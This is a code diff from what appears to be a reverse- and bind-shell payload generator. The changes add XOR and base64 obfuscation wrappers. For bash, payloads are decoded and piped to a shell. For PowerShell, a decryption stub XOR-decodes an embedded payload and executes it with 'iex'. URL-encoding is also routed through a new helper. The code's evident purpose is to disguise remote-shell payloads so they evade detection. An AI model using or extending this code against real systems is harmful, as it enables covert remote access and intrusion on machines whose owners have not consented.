@@ -1,20 +1,31 @@
-from encoders import powershell_base64
+from encoders import powershell_base64, xor, to_unicode, to_urlencode
 from binascii import hexlify
 import platform
-import urllib
 
 def xor_wrapper(name, code, args, shell="/bin/bash"):
-    if args.xor is True:
-        if "powershell" not in name.lower():
-            code = """s="";for x in $(echo {0}|sed 's/../&\\\\n/g'); do s=$s$(echo -e $(awk "BEGIN {printf \\"%x\\n\\", xor(0x$x, {1})}"|sed 's/../\\\\x&/g'));done;echo $s|{2}""".format(hexlify(xor(code, args.xor)), hex(args.xor), shell)
-            return code
-        else:
-            return code
+    if args.shell is not "":
+        shell = args.shell
+    if "powershell" not in name.lower():
+        code = """s="";for x in $(echo {0}|sed "s/../&\\n/g"); do s=$s$(echo -e $(awk "BEGIN {{printf \\"%x\\n\\", xor(0x$x, {1})}}"|sed "s/../\\\\\\\\x&/g"));done;echo $s|{2}""".format(hexlify(xor(code, args.xor)), hex(args.xor), shell)
+        code = shell + " -c '" + code + "'"
+    else:
+        prefix, xcode = code.split("-Command")
+        pcode = xcode.replace("'", "")
+        pcode = pcode.replace("\\", "")
 
-def base64_wrapper(name, code, args):
+        code = to_unicode(pcode)
+        code = xor(code, args.xor) # XOR encode using random key <--
+        code = powershell_base64(code, unicode_encoding=False) # We need it in base64 because it is binary
+        code = """$k={0};$b="{1}";$d=[Convert]::FromBase64String($b);$dd=foreach($byte in $d) {{$byte -bxor $k}};$dm=[System.Text.Encoding]::Unicode.GetString($dd);iex $dm""".format(args.xor, code) # Decryption stub
+        code= prefix + "-Command" + "'%s'" % code
+    return code
+
+def base64_wrapper(name, code, args,shell="/bin/bash"):
+    if args.shell is not "":
+        shell = args.shell
     if args.base64 is True:
         if "powershell" not in name.lower():
-            code = "echo " + code.encode("base64").replace("\n", "") + "|base64 -d|bash"
+            code = "echo " + code.encode("base64").replace("\n", "") + "|base64 -d|{0}".format(shell)
         else:
             # Powershell encoding code
             prefix, xcode = code.split("-Command")
@@ -46,7 +57,7 @@ class ReverseShell(object):
 
         # Apply URL-encoding
         if self.args.urlencode is True:
-            self.code = urllib.quote(self.code)
+            self.code = to_urlencode(self.code)
         
         return self.code
 
@@ -72,7 +83,7 @@ class BindShell(object):
 
         # Apply url-encoding
         if self.args.urlencode is True:
-            self.code = urllib.quote(self.code)
+            self.code = to_urlencode(self.code)
         
         return self.code
 
